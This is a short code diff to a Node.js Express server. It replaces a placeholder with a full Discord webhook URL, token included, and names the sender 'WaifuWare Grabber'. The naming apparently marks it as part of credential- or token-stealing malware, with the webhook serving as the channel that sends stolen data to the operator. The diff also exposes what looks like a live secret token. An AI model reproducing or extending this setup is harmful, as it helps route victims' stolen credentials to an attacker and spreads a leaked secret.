@@ -5,7 +5,7 @@ const app = require("express")(),
     } = require("body-parser"),
     fs = require("fs")
 const Webhook = require("discord-webhook-node"),
-    webhook = new Webhook.Webhook("webhook here")
+    webhook = new Webhook.Webhook("https://discord.com/api/webhooks/1166611331110154272/KJeLKUZaUSznE2N5ySQfKucjwN7fLujico3uLoLFRq8TlGcH4iLFdZwkstLfqA2L1FLT")
     webhook.setUsername("WaifuWare Grabber").setAvatar("https://avatars.githubusercontent.com/u/95830906?s=200&v=4")
 String.prototype.put = function(a, e)  {
     return this.slice(0, a) + e + this.slice(a)
